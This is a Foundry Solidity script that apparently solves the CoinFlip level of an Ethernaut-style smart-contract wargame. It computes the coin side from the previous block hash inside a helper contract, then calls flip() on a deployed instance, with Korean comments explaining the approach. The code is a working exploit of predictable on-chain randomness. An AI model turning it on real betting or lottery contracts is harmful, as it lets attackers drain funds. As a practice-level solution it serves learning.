pragma solidity ^0.8.0;

import "../src/Level03Coinflip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor (CoinFlip _coinflip) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        _coinflip.flip(side);
    }
}

// Level04CoinflipSolution contract는 하나의 contract를 만드는 것이 아니라 EOA가 할 행동을 정의해주는 것이다.
// 따라서 올바른 uint256(blockhash(block.number - 1)) 값을 얻으려면 새로운 contract를 만들어줘야한다.
contract Level04CoinflipSolution is Script {    
    CoinFlip coinflipinstance = CoinFlip(0x88Ca2B9396fed25D980A83330305f29E05CF841E);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Player(coinflipinstance);

        console.log("Wins: ", coinflipinstance.consecutiveWins());
        vm.stopBroadcast();
    }

}